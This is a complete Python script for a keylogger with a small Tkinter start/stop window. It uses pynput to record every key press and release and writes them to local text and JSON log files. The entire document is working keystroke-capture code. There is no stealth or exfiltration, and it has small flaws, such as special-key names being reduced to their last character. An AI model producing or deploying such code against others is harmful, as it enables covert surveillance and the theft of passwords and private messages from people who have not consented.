import tkinter as tk
from tkinter import messagebox
from pynput import keyboard
import json
import threading

keys_used = []
flag = False
keys = ""

def on_press(key):
    global keys_used
    try:
        keys_used.append({'Pressed': f'{key.char}'})
    except AttributeError:
        keys_used.append({'Pressed': f'{key}'})
    update_log_files()

def on_release(key):
    global keys_used
    keys_used.append({'Released': f'{key}'})
    update_log_files()

def update_log_files():
    text_log = ''.join(k['Pressed'][-1] if 'Pressed' in k and isinstance(k['Pressed'], str) else '' for k in keys_used)
    generate_text_log(text_log)
    generate_json_file(keys_used)

def generate_text_log(key_str):
    with open('key_log.txt', "w+") as keys_file:
        keys_file.write(key_str)

def generate_json_file(keys_used):
    with open('key_log.json', 'w') as key_log:
        json.dump(keys_used, key_log, indent=4)

def start_keylogger():
    global listener
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    label.config(text="[+] Keylogger is running!n[!] Saving the keys in 'key_log.txt' and 'key_log.json'")
    start_button.config(state='disabled')
    stop_button.config(state='normal')

def stop_keylogger():
    global listener
    listener.stop()
    label.config(text="Keylogger stopped.")
    start_button.config(state='normal')
    stop_button.config(state='disabled')

root = tk.Tk()
root.title("Keylogger")

listener = None

label = tk.Label(root, text='Click "Start" to begin keylogging.')
label.config(anchor=tk.CENTER)
label.pack()

start_button = tk.Button(root, text="Start", command=lambda: threading.Thread(target=start_keylogger).start())
start_button.pack(side=tk.LEFT)

stop_button = tk.Button(root, text="Stop", command=stop_keylogger, state='disabled')
stop_button.pack(side=tk.RIGHT)

root.geometry("400x200")

root.mainloop()
